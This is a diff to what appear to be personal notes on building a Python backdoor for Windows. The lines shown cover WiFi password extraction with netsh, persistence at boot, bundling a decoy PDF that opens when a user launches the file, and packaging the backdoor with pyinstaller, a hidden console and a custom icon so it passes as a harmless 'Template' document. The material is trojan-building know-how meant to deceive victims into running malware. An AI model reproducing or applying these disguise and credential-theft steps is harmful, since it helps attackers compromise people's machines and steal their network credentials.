@@ -2,7 +2,7 @@
 - Initial Execution
 - ![Screenshot 2024-08-08 125205.png](./assets/Screenshot_2024-08-08_125205_1723103941525_0.png)
 - Execution after Boot [ Windows-Persistence]
-- ![Screenshot 2024-08-08 125543.png](../assets/Screenshot_2024-08-08_125543_1723103929817_0.png)
+- ![Screenshot 2024-08-08 125543.png](./assets/Screenshot_2024-08-08_125543_1723103929817_0.png)
 ### </>
 - **WiFi-Password Extraction**
 	- To show all networks - `netsh wlan show profile`
@@ -51,6 +51,7 @@
 	  subprocess.call(file_name, shell = True)
 	  ```
    	- `_MEIPASS` : the path to the _internal folder within the bundle [ in this case, the Non-Malicious PDF ]
+   	- The Backdoor also checks if the current process is being run by a `user` or being run automatically on startup; If it is run by a `user` the PDF file is opened 
 - **mask executable** with `.ICO`
 	- `pyinstaller --add-data "../dummy/Template.pdf:." --onefile --noconsole backdoor.py -n Template --icon <path-to-ico-file>`
 	- ![image.png](./assets/image_1722969936363_0.png)
